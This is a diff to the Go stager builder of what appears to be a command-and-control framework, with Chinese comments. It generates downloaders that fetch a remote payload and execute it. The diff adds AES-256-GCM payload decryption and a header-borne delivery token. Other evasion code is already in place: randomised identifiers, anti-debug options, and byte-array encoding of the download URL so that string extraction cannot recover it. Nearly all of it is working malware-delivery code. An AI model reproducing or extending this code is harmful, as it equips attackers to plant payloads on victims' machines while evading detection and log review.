@@ -28,7 +28,11 @@ type StagerConfig struct {
 	MaxRetries  int    // 最大重试次数
 	Lightweight bool   // 轻量模式（移除HTTPS支持以减小体积）
 	Password    string // 上线密码
-	XorKey      int    // Stage XOR 混淆密钥（0=不解密；下载载荷后先 XOR 还原再执行）
+	XorKey      int    // Stage XOR 混淆密钥（0=不解密；仅 CryptoMode=xor 时使用）
+	AccessToken string // 投递访问令牌（非空时以 X-Delivery-Token 头携带，避免 ?t= 进 URL 日志）
+	// 载荷加密：CryptoMode=aead 时，下载到的完整载荷按 AES-256-GCM 解密。
+	CryptoMode  string
+	DeliveryKey []byte // AEAD 密钥（32 字节）
 }
 
 // StagerBuilder 构建器
@@ -99,6 +103,18 @@ func strBytesLiteral(s string) string {
 	return strings.Join(parts, ",")
 }
 
+// byteSliceLiteral 将字节切片转为 Go 字节数组字面量。
+func byteSliceLiteral(b []byte) string {
+	if len(b) == 0 {
+		return "0"
+	}
+	parts := make([]string, len(b))
+	for i, c := range b {
+		parts[i] = strconv.Itoa(int(c))
+	}
+	return strings.Join(parts, ",")
+}
+
 // GenerateSourceCode 生成源代码
 func (sb *StagerBuilder) GenerateSourceCode() error {
 	vars := sb.GenerateVariableNames()
@@ -111,7 +127,9 @@ package main
 
 import (
 	"crypto/tls"
-	"io"
+	{{if .AEAD}}"crypto/aes"
+	"crypto/cipher"
+	{{end}}"io"
 	"net/http"
 	{{if .AntiDebug}}"os"{{end}}
 	"syscall"
@@ -134,6 +152,25 @@ func {{.randomUaVar}}() string {
 	{{.randomUaData}} := []byte{ {{.UaBytes}} }
 	return string({{.randomUaData}})
 }
+
+{{if .AEAD}}
+// AES-256-GCM 解密（nonce || ciphertext || tag）
+func {{.randomAEADFunc}}(data []byte, key []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil || len(data) < gcm.NonceSize() {
+		return nil
+	}
+	out, err := gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
+	if err != nil {
+		return nil
+	}
+	return out
+}
+{{end}}
 
 {{if gt .XorKey 0}}
 // XOR 还原载荷（与投递端 XorKey 一致，单字节异或）
@@ -202,6 +239,7 @@ func {{.randomFunc3}}() []byte {
 		}
 		
 		{{.randomVar4}}.Header.Set("User-Agent", {{.randomUaVar}}())
+		{{if .HasAccessToken}}{{.randomVar4}}.Header.Set("X-Delivery-Token", {{.AccessToken}}){{end}}
 		
 		{{.RESP}}, {{.ERR}} := {{.CLIENT}}.Do({{.randomVar4}})
 		if {{.ERR}} != nil {
@@ -255,6 +293,7 @@ func main() {
 	
 	{{.DATA}} := {{if .Obfuscation}}{{.randomFunc5}}(){{else}}{{.randomFunc3}}(){{end}}
 	if {{.DATA}} != nil {
+		{{if .AEAD}}{{.DATA}} = {{.randomAEADFunc}}({{.DATA}}, []byte{ {{.DeliveryKeyBytes}} }); if {{.DATA}} == nil { return }{{end}}
 		{{if gt .XorKey 0}}{{.randomXorFunc}}({{.DATA}}){{end}}
 		{{if .Obfuscation}}{{.randomFunc6}}({{.DATA}}){{else}}{{.randomFunc4}}({{.DATA}}){{end}}
 	}
@@ -267,7 +306,9 @@ package main
 
 import (
 	"crypto/tls"
-	"fmt"
+	{{if .AEAD}}"crypto/aes"
+	"crypto/cipher"
+	{{end}}"fmt"
 	"io"
 	"math/rand"
 	"net/http"
@@ -294,6 +335,25 @@ func {{if .Obfuscation}}{{.randomUaVar}}{{else}}getUA{{end}}() string {
 	{{if .Obfuscation}}{{.randomUaData}}{{else}}uab{{end}} := []byte{ {{.UaBytes}} }
 	return string({{if .Obfuscation}}{{.randomUaData}}{{else}}uab{{end}})
 }
+
+{{if .AEAD}}
+// AES-256-GCM 解密（nonce || ciphertext || tag）
+func {{.randomAEADFunc}}(data []byte, key []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil || len(data) < gcm.NonceSize() {
+		return nil
+	}
+	out, err := gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
+	if err != nil {
+		return nil
+	}
+	return out
+}
+{{end}}
 
 {{if gt .XorKey 0}}
 // XOR 还原载荷（与投递端 XorKey 一致）
@@ -325,6 +385,7 @@ func {{if .Obfuscation}}{{.DOWNLOAD_FUNC}}{{else}}downloadFunc{{end}}() []byte {
 		}
 		
 		{{if .Obfuscation}}{{.randomVar4}}{{else}}req{{end}}.Header.Set("User-Agent", {{if .Obfuscation}}{{.randomUaVar}}{{else}}getUA{{end}}())
+		{{if .HasAccessToken}}{{if .Obfuscation}}{{.randomVar4}}{{else}}req{{end}}.Header.Set("X-Delivery-Token", {{.AccessToken}}){{end}}
 		
 		{{if .Obfuscation}}{{.randomVar6}}, {{.randomVar5}}{{else}}resp, err{{end}} := {{if .Obfuscation}}{{.randomVar3}}{{else}}client{{end}}.Do({{if .Obfuscation}}{{.randomVar4}}{{else}}req{{end}})
 		if {{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} != nil {
@@ -389,6 +450,7 @@ func main() {
 	
 	{{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} := {{if .Obfuscation}}{{.DOWNLOAD_FUNC}}{{else}}downloadFunc{{end}}()
 	if {{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} != nil {
+		{{if .AEAD}}{{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} = {{.randomAEADFunc}}({{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}}, []byte{ {{.DeliveryKeyBytes}} }); if {{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} == nil { return }{{end}}
 		{{if gt .XorKey 0}}{{if .Obfuscation}}{{.randomXorFunc}}{{else}}xorDecode{{end}}({{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}}){{end}}
 		{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}} := {{if .Obfuscation}}{{.EXECUTE_FUNC}}{{else}}executeFunc{{end}}({{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}})
 		{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}.Wait()
@@ -409,32 +471,33 @@ func main() {
 
 	// 生成随机函数名和变量名
 	funcVars := map[string]string{
-		"randomFunc1":   sb.randomString(12),
-		"randomFunc2":   sb.randomString(11),
-		"randomFunc3":   sb.randomString(13),
-		"randomFunc4":   sb.randomString(10),
-		"randomFunc5":   sb.randomString(14), // 混淆专用
-		"randomFunc6":   sb.randomString(15), // 混淆专用
-		"randomVar1":    sb.randomString(8),
-		"randomVar2":    sb.randomString(9),
-		"randomVar3":    sb.randomString(7),
-		"randomVar4":    sb.randomString(10),
-		"randomVar5":    sb.randomString(8), // 通用err变量
-		"randomVar6":    sb.randomString(9),
-		"randomVar7":    sb.randomString(11), // data变量
-		"randomVar8":    sb.randomString(12), // 函数参数
-		"randomVar9":    sb.randomString(10), // size变量
-		"randomVar10":   sb.randomString(13), // tempFile变量
-		"randomVar11":   sb.randomString(7),  // done变量
-		"randomVar12":   sb.randomString(8),  // cleanupDone变量
-		"randomVar13":   sb.randomString(9),  // cmd变量
-		"randomString1": sb.randomString(8),  // Linux专用：临时文件前缀
-		"randomXorFunc": sb.randomString(10), // XOR 解密函数名
-		"randomXorArg":  sb.randomString(8),  // XOR 解密参数名
-		"randomUrlVar":  sb.randomString(8),  // URL 构造函数名
-		"randomUrlData": sb.randomString(7),  // URL 字节数组变量
-		"randomUaVar":   sb.randomString(9),  // UA 构造函数名
-		"randomUaData":  sb.randomString(8),  // UA 字节数组变量
+		"randomFunc1":    sb.randomString(12),
+		"randomFunc2":    sb.randomString(11),
+		"randomFunc3":    sb.randomString(13),
+		"randomFunc4":    sb.randomString(10),
+		"randomFunc5":    sb.randomString(14), // 混淆专用
+		"randomFunc6":    sb.randomString(15), // 混淆专用
+		"randomVar1":     sb.randomString(8),
+		"randomVar2":     sb.randomString(9),
+		"randomVar3":     sb.randomString(7),
+		"randomVar4":     sb.randomString(10),
+		"randomVar5":     sb.randomString(8), // 通用err变量
+		"randomVar6":     sb.randomString(9),
+		"randomVar7":     sb.randomString(11), // data变量
+		"randomVar8":     sb.randomString(12), // 函数参数
+		"randomVar9":     sb.randomString(10), // size变量
+		"randomVar10":    sb.randomString(13), // tempFile变量
+		"randomVar11":    sb.randomString(7),  // done变量
+		"randomVar12":    sb.randomString(8),  // cleanupDone变量
+		"randomVar13":    sb.randomString(9),  // cmd变量
+		"randomString1":  sb.randomString(8),  // Linux专用：临时文件前缀
+		"randomXorFunc":  sb.randomString(10), // XOR 解密函数名
+		"randomXorArg":   sb.randomString(8),  // XOR 解密参数名
+		"randomAEADFunc": sb.randomString(12), // AEAD 解密函数名
+		"randomUrlVar":   sb.randomString(8),  // URL 构造函数名
+		"randomUrlData":  sb.randomString(7),  // URL 字节数组变量
+		"randomUaVar":    sb.randomString(9),  // UA 构造函数名
+		"randomUaData":   sb.randomString(8),  // UA 字节数组变量
 	}
 
 	// 合并所有变量
@@ -445,17 +508,27 @@ func main() {
 	for k, v := range funcVars {
 		allVars[k] = v
 	}
+	// AEAD 与单字节 XOR 互斥；显式 none 也不能再按旧 XorKey 解密（否则会把明文再 XOR 坏）。
+	mode := strings.ToLower(strings.TrimSpace(sb.config.CryptoMode))
+	xorKey := sb.config.XorKey
+	if mode == "aead" || mode == "none" {
+		xorKey = 0
+	}
 	for k, v := range map[string]interface{}{
 		// D44: 字符串值经 strconv.Quote 转义后注入模板，防止 " 或 \ 破坏生成源码 / 注入任意 Go 代码
-		"DownloadURL": strconv.Quote(sb.config.DownloadURL),
-		"UserAgent":   strconv.Quote(sb.config.UserAgent),
-		"Timeout":     sb.config.Timeout,
-		"SleepTime":   sb.config.SleepTime,
-		"MaxRetries":  sb.config.MaxRetries,
-		"AntiDebug":   sb.config.AntiDebug,
-		"Obfuscation": sb.config.Obfuscation,
-		"Password":    strconv.Quote(sb.config.Password), // 添加密码字段
-		"XorKey":      sb.config.XorKey,                  // Stage XOR 混淆密钥（0=不启用）
+		"DownloadURL":      strconv.Quote(sb.config.DownloadURL),
+		"UserAgent":        strconv.Quote(sb.config.UserAgent),
+		"Timeout":          sb.config.Timeout,
+		"SleepTime":        sb.config.SleepTime,
+		"MaxRetries":       sb.config.MaxRetries,
+		"AntiDebug":        sb.config.AntiDebug,
+		"Obfuscation":      sb.config.Obfuscation,
+		"Password":         strconv.Quote(sb.config.Password), // 添加密码字段
+		"XorKey":           xorKey,                            // Stage XOR 混淆密钥（AEAD 模式下强制 0）
+		"HasAccessToken":   sb.config.AccessToken != "",
+		"AccessToken":      strconv.Quote(sb.config.AccessToken), // 投递访问令牌（Header 传递）
+		"AEAD":             strings.EqualFold(sb.config.CryptoMode, "aead") && len(sb.config.DeliveryKey) == 32,
+		"DeliveryKeyBytes": byteSliceLiteral(sb.config.DeliveryKey),
 		// URL/UA 转字节数组字面量（如 104,116,116,112,...），模板中以 []byte{...} 拼接，
 		// 规避 strings 命令直接提取下载地址/UA 字符串
 		"UrlBytes": strBytesLiteral(sb.config.DownloadURL),
